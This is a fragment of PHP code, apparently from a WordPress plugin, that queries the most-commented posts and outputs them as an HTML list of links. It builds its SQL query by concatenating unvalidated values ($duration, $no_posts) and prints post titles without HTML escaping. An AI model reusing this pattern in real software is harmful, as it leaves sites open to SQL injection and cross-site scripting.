	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>